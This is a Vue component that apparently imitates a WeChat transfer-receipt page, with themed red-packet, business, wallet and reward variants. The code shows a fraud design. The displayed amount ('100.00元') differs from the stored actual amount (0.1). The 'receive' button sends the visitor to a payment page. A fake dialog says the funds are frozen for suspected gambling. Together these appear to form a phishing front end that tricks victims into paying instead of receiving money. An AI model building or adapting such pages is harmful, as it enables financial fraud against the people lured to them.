<template>
  <div class="wechat-receive-page" :data-theme="currentTheme.id" :style="themeStyles">
    <!-- 顶部导航栏 -->
    <div class="header-bar">
      <div class="close-btn" @click="goBack">×</div>
      <div class="domain-text">{{ siteDomain }}</div>
      <div class="menu-btn">⋯</div>
    </div>
    
    <!-- 红包主题特殊背景 -->
    <div v-if="currentTheme.id === 'redpacket'" class="redpacket-bg"></div>
    
    <!-- 主内容区域 -->
    <div class="main-content">
      <!-- 时钟/图标 -->
      <div class="icon-wrapper">
        <div class="main-icon" :class="`icon-${currentTheme.id}`">
          <component :is="getIconComponent()" />
        </div>
      </div>
      
      <!-- 状态文字 -->
      <div class="status-text" :class="`status-${currentTheme.id}`">
        {{ getStatusText() }}
      </div>
      
      <!-- 金额显示 -->
      <div class="amount-wrapper">
        <span class="currency-symbol">¥</span>
        <span class="amount-number">{{ displayAmount }}</span>
      </div>
      
      <!-- 转账时间 -->
      <div class="time-row">
        <span class="time-label">转账时间</span>
        <span class="time-spacing">　　　　</span>
        <span class="time-value">{{ formatDateTime(transferData.createdAt) }}</span>
      </div>
      
      <!-- 主题特殊元素 -->
      <div v-if="currentTheme.id === 'redpacket'" class="redpacket-wish">
        恭喜发财，大吉大利
      </div>
    </div>
    
    <!-- 底部区域 -->
    <div class="bottom-section">
      <!-- 收款按钮 -->
      <button 
        class="receive-btn"
        :class="{ 'frozen': transferData.accountStatus === 'frozen' }"
        @click="handleReceive"
        :disabled="transferData.accountStatus === 'frozen' || transferData.status !== 'pending'"
      >
        {{ getButtonText() }}
      </button>
      
      <!-- 提示文字 -->
      <div class="tips-row">
        <span class="tips-text">{{ getTipsText() }}</span>
      </div>
    </div>
    
    <!-- 冻结提示弹窗 -->
    <div class="freeze-dialog" v-if="showFreezeDialog" @click="showFreezeDialog = false">
      <div class="dialog-content" @click.stop>
        <div class="dialog-title">{{ siteDomain }}</div>
        <div class="dialog-message">资金涉嫌赌博，已被冻结</div>
        <div class="dialog-btn" @click="showFreezeDialog = false">确定</div>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, computed, onMounted, onUnmounted, h } from 'vue';
import { useRouter, useRoute } from 'vue-router';
import { showToast } from 'vant';
import axios from 'axios';
import { getTheme } from '@/styles/themes';

const router = useRouter();
const route = useRoute();

const siteDomain = ref(window.location.hostname || 'qqiwxi.nmmbz.cn');
const showFreezeDialog = ref(false);

const transferData = ref({
  id: '',
  displayName: '100.00元',
  actualAmount: 0.1,
  senderName: '张三',
  senderAvatar: '',
  message: '',
  status: 'pending',
  accountStatus: 'available',
  theme: 'classic',
  createdAt: new Date().toISOString(),
  updatedAt: null
});

// 当前主题
const currentTheme = computed(() => getTheme(transferData.value.theme));

// 主题样式
const themeStyles = computed(() => {
  const theme = currentTheme.value;
  return {
    '--theme-primary': theme.colors.primary,
    '--theme-primary-light': theme.colors.primaryLight,
    '--theme-gradient': theme.colors.gradient,
    '--theme-shadow': theme.colors.shadow,
    '--theme-icon-bg': theme.colors.iconBg,
    '--theme-text': theme.colors.text,
    '--theme-text-secondary': theme.colors.textSecondary,
    '--theme-bg': theme.colors.bg,
    '--theme-card-bg': theme.colors.cardBg,
    '--theme-button-radius': theme.styles.buttonRadius,
    '--theme-card-radius': theme.styles.cardRadius,
    '--theme-icon-size': theme.styles.iconSize
  };
});

// 根据主题获取图标组件
const getIconComponent = () => {
  const theme = currentTheme.value.id;
  
  switch(theme) {
    case 'redpacket':
      // 红包图标
      return h('div', { class: 'redpacket-icon' }, '🧧');
    case 'business':
      // 企业图标
      return h('div', { class: 'business-icon' }, '🏢');
    case 'payment':
      // 收款码图标
      return h('div', { class: 'payment-icon' }, '💳');
    case 'wallet':
      // 零钱通图标
      return h('div', { class: 'wallet-icon' }, '💰');
    case 'reward':
      // 奖励图标
      return h('div', { class: 'reward-icon' }, '🎁');
    default:
      // 经典转账 - 时钟图标
      return h('svg', {
        width: '48',
        height: '48',
        viewBox: '0 0 48 48',
        fill: 'none'
      }, [
        h('circle', {
          cx: '24',
          cy: '24',
          r: '23',
          stroke: '#b2b2b2',
          'stroke-width': '2'
        }),
        h('line', {
          x1: '24',
          y1: '24',
          x2: '24',
          y2: '12',
          stroke: '#b2b2b2',
          'stroke-width': '2',
          'stroke-linecap': 'round'
        }),
        h('line', {
          x1: '24',
          y1: '24',
          x2: '32',
          y2: '24',
          stroke: '#b2b2b2',
          'stroke-width': '2',
          'stroke-linecap': 'round'
        })
      ]);
  }
};

// 根据主题获取状态文字
const getStatusText = () => {
  const theme = currentTheme.value.id;
  
  switch(theme) {
    case 'redpacket':
      return '恭喜发财';
    case 'business':
      return '待你确认';
    case 'payment':
      return '待你收款';
    case 'wallet':
      return '待你转入';
    case 'reward':
      return '待你领取';
    default:
      return '待你收款';
  }
};

// 根据主题获取按钮文字
const getButtonText = () => {
  const theme = currentTheme.value.id;
  
  switch(theme) {
    case 'redpacket':
      return '开';
    case 'business':
      return '确认收款';
    case 'payment':
      return '收款';
    case 'wallet':
      return '转入零钱通';
    case 'reward':
      return '领取奖励';
    default:
      return '收款';
  }
};

// 根据主题获取提示文字
const getTipsText = () => {
  const theme = currentTheme.value.id;
  
  switch(theme) {
    case 'redpacket':
      return '24小时内未领取，红包将退回';
    case 'business':
      return '请确认转账信息无误后收款';
    case 'payment':
      return '1天内未确认，将退还给对方';
    case 'wallet':
      return '转入零钱通，享受稳健收益';
    case 'reward':
      return '奖励有效期24小时';
    default:
      return '1天内未确认，将退还给对方';
  }
};

// 计算显示金额
const displayAmount = computed(() => {
  return transferData.value.displayName.replace('元', '').replace('，', '');
});

// 获取转账信息
const fetchTransferInfo = async () => {
  try {
    const { id } = route.params;
    const response = await axios.get(`/api/transfers/${id}`);
    
    const isSuccess = response.data?.success ?? true;
    const data = response.data?.data ?? response.data;
    
    if (isSuccess && data) {
      transferData.value = {
        ...data,
        theme: data.theme || 'classic', // 确保有主题
        createdAt: data.createdAt || data.createTime || new Date().toISOString(),
        updatedAt: data.updatedAt || data.receiveTime || null
      };
    } else {
      showToast('转账信息不存在');
      setTimeout(() => {
        router.push('/');
      }, 1500);
    }
  } catch (error) {
    console.error('获取转账信息失败:', error);
    showToast('获取转账信息失败');
  }
};

// 处理收款
const handleReceive = async () => {
  if (transferData.value.accountStatus === 'frozen') {
    showFreezeDialog.value = true;
    return;
  }
  
  if (transferData.value.status !== 'pending') {
    showToast('该转账已处理');
    return;
  }
  
  router.push(`/payment/${transferData.value.id}`);
};

// 返回
const goBack = () => {
  router.go(-1);
};

// 格式化日期时间
const formatDateTime = (datetime) => {
  if (!datetime) return '';
  
  const date = new Date(datetime);
  const year = date.getFullYear();
  const month = String(date.getMonth() + 1).padStart(2, '0');
  const day = String(date.getDate()).padStart(2, '0');
  const hours = String(date.getHours()).padStart(2, '0');
  const minutes = String(date.getMinutes()).padStart(2, '0');
  const seconds = String(date.getSeconds()).padStart(2, '0');
  
  return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
};

let refreshInterval;

onMounted(() => {
  fetchTransferInfo();
  
  refreshInterval = setInterval(() => {
    fetchTransferInfo();
  }, 3000);
});

onUnmounted(() => {
  if (refreshInterval) {
    clearInterval(refreshInterval);
  }
});
</script>

<style scoped>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

.wechat-receive-page {
  width: 100%;
  min-height: 100vh;
  min-height: -webkit-fill-available;
  background-color: var(--theme-bg);
  display: flex;
  flex-direction: column;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
  position: relative;
  overflow-x: hidden;
  transition: background-color 0.3s;
}

/* 红包主题背景图案 */
.redpacket-bg {
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-image: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M30 0L35 20L55 30L35 40L30 60L25 40L5 30L25 20Z' fill='%23ffe0e0' opacity='0.15'/%3E%3C/svg%3E");
  background-size: 60px 60px;
  pointer-events: none;
  z-index: 0;
}

/* 顶部导航栏 */
.header-bar {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 10px 16px;
  background-color: #ffffff;
  border-bottom: 1px solid #e5e5e5;
  height: 44px;
  position: relative;
  z-index: 10;
}

.close-btn,
.menu-btn {
  min-width: 44px;
  min-height: 44px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 28px;
  color: #000000;
  cursor: pointer;
  user-select: none;
  -webkit-tap-highlight-color: transparent;
}

.close-btn:active,
.menu-btn:active {
  opacity: 0.6;
}

.close-btn {
  font-weight: 300;
  padding-bottom: 4px;
}

.menu-btn {
  font-size: 24px;
  letter-spacing: 2px;
  padding-bottom: 2px;
}

.domain-text {
  flex: 1;
  text-align: center;
  font-size: 14px;
  color: #888888;
  letter-spacing: 0.5px;
}

/* 主内容区域 */
.main-content {
  flex: 1;
  display: flex;
  flex-direction: column;
  align-items: center;
  padding-top: 80px;
  padding-bottom: 40px;
  position: relative;
  z-index: 1;
}

.icon-wrapper {
  margin-bottom: 28px;
}

.main-icon {
  width: 80px;
  height: 80px;
  background-color: var(--theme-card-bg);
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
  font-size: 48px;
  transition: all 0.3s;
}

/* 红包主题图标样式 */
.icon-redpacket {
  background: linear-gradient(135deg, #ff6b6b 0%, #f43f3b 100%);
  box-shadow: 0 4px 16px rgba(244, 63, 59, 0.3);
  font-size: 52px;
  animation: redpacketShake 2s infinite;
}

@keyframes redpacketShake {
  0%, 100% { transform: rotate(0deg); }
  25% { transform: rotate(-5deg); }
  75% { transform: rotate(5deg); }
}

/* 企业主题图标样式 */
.icon-business {
  background: linear-gradient(135deg, #4a9ff5 0%, #2b7bd6 100%);
  box-shadow: 0 4px 12px rgba(43, 123, 214, 0.25);
  font-size: 44px;
}

/* 收款码主题图标样式 */
.icon-payment {
  background: linear-gradient(135deg, #2aae67 0%, #07c160 100%);
  box-shadow: 0 4px 12px rgba(7, 193, 96, 0.25);
  font-size: 44px;
}

/* 零钱通主题图标样式 */
.icon-wallet {
  background: linear-gradient(135deg, #b987d4 0%, #9b59b6 100%);
  box-shadow: 0 4px 12px rgba(155, 89, 182, 0.25);
  font-size: 44px;
}

/* 奖励主题图标样式 */
.icon-reward {
  background: linear-gradient(135deg, #ffd700 0%, #d4a574 100%);
  box-shadow: 0 4px 16px rgba(212, 165, 116, 0.3);
  font-size: 44px;
  animation: rewardPulse 2s infinite;
}

@keyframes rewardPulse {
  0%, 100% { transform: scale(1); }
  50% { transform: scale(1.05); }
}

.status-text {
  font-size: 16px;
  color: var(--theme-text-secondary);
  margin-bottom: 32px;
  letter-spacing: 0.5px;
  transition: color 0.3s;
}

/* 红包主题状态文字样式 */
.status-redpacket {
  font-size: 18px;
  font-weight: 500;
  color: var(--theme-text);
}

.amount-wrapper {
  display: flex;
  align-items: baseline;
  margin-bottom: 48px;
}

.currency-symbol {
  font-size: 32px;
  color: var(--theme-text);
  font-weight: 400;
  margin-right: 4px;
  line-height: 1;
  transition: color 0.3s;
}

.amount-number {
  font-size: 56px;
  color: var(--theme-text);
  font-weight: 500;
  line-height: 1;
  letter-spacing: -1px;
  transition: color 0.3s;
}

.time-row {
  font-size: 14px;
  color: var(--theme-text-secondary);
  letter-spacing: 0.5px;
  display: flex;
  align-items: center;
  transition: color 0.3s;
}

/* 红包祝福语 */
.redpacket-wish {
  margin-top: 20px;
  font-size: 14px;
  color: #c07850;
  letter-spacing: 2px;
  font-weight: 500;
}

/* 底部区域 */
.bottom-section {
  padding: 0 24px 32px;
  position: relative;
  z-index: 1;
}

.receive-btn {
  width: 100%;
  height: 50px;
  background: var(--theme-gradient);
  border: none;
  border-radius: var(--theme-button-radius);
  color: #ffffff;
  font-size: 17px;
  font-weight: 500;
  cursor: pointer;
  transition: all 0.2s;
  box-shadow: var(--theme-shadow);
  letter-spacing: 1px;
  margin-bottom: 16px;
  position: relative;
  overflow: hidden;
}

/* 红包主题按钮特殊样式 */
[data-theme="redpacket"] .receive-btn {
  border-radius: 25px;
  height: 54px;
  font-size: 20px;
  font-weight: 600;
  letter-spacing: 4px;
}

/* 企业主题按钮特殊样式 */
[data-theme="business"] .receive-btn {
  border-radius: 6px;
  letter-spacing: 2px;
}

/* 奖励主题按钮特殊样式 */
[data-theme="reward"] .receive-btn {
  border-radius: 12px;
  font-weight: 600;
  box-shadow: 0 6px 20px rgba(212, 165, 116, 0.4);
}

.receive-btn:active:not(:disabled) {
  transform: scale(0.98);
}

.receive-btn.frozen,
.receive-btn:disabled {
  background: #c8c9cc;
  box-shadow: none;
  cursor: not-allowed;
  color: #ffffff;
  transform: none;
}

.tips-row {
  text-align: center;
  font-size: 12px;
  color: var(--theme-text-secondary);
  letter-spacing: 0.3px;
  transition: color 0.3s;
}

/* 冻结提示弹窗 */
.freeze-dialog {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: rgba(0, 0, 0, 0.6);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 9999;
  animation: fadeIn 0.2s;
}

@keyframes fadeIn {
  from { opacity: 0; }
  to { opacity: 1; }
}

.dialog-content {
  width: 280px;
  background-color: #ffffff;
  border-radius: 12px;
  overflow: hidden;
  animation: scaleIn 0.2s;
}

@keyframes scaleIn {
  from {
    transform: scale(0.9);
    opacity: 0;
  }
  to {
    transform: scale(1);
    opacity: 1;
  }
}

.dialog-title {
  padding: 24px 24px 8px;
  font-size: 17px;
  font-weight: 500;
  color: #000000;
  text-align: center;
}

.dialog-message {
  padding: 8px 24px 24px;
  font-size: 14px;
  color: #888888;
  text-align: center;
  line-height: 1.6;
}

.dialog-btn {
  height: 48px;
  display: flex;
  align-items: center;
  justify-content: center;
  border-top: 1px solid #e5e5e5;
  font-size: 17px;
  color: var(--theme-primary);
  font-weight: 500;
  cursor: pointer;
}

.dialog-btn:active {
  background-color: #f5f5f5;
}

/* 响应式调整 */
@media (max-width: 375px) {
  .amount-number {
    font-size: 48px;
  }
  
  .currency-symbol {
    font-size: 28px;
  }
  
  .main-icon {
    width: 70px;
    height: 70px;
  }
  
  .main-content {
    padding-top: 60px;
  }
  
  .receive-btn {
    height: 46px;
    font-size: 16px;
  }
  
  [data-theme="redpacket"] .receive-btn {
    height: 50px;
    font-size: 18px;
  }
}

@media (max-width: 320px) {
  .amount-number {
    font-size: 42px;
  }
  
  .currency-symbol {
    font-size: 24px;
  }
  
  .status-text {
    font-size: 14px;
  }
  
  .receive-btn {
    height: 44px;
    font-size: 15px;
  }
  
  .bottom-section {
    padding: 0 16px 24px;
  }
}

@media (min-width: 414px) {
  .amount-number {
    font-size: 64px;
  }
  
  .currency-symbol {
    font-size: 36px;
  }
  
  .receive-btn {
    height: 54px;
    font-size: 18px;
  }
  
  [data-theme="redpacket"] .receive-btn {
    height: 58px;
    font-size: 22px;
  }
}

@media (orientation: landscape) and (max-height: 500px) {
  .main-content {
    padding-top: 30px;
    padding-bottom: 20px;
  }
  
  .icon-wrapper {
    margin-bottom: 16px;
  }
  
  .status-text {
    margin-bottom: 20px;
  }
  
  .amount-wrapper {
    margin-bottom: 30px;
  }
  
  .main-icon {
    width: 60px;
    height: 60px;
  }
}

@media (min-width: 768px) {
  .wechat-receive-page {
    max-width: 414px;
    margin: 0 auto;
    box-shadow: 0 0 30px rgba(0, 0, 0, 0.15);
  }
}

@supports (padding: max(0px)) {
  .header-bar {
    padding-top: max(10px, env(safe-area-inset-top));
    padding-left: max(16px, env(safe-area-inset-left));
    padding-right: max(16px, env(safe-area-inset-right));
  }
  
  .bottom-section {
    padding-bottom: max(32px, env(safe-area-inset-bottom));
  }
}
</style>
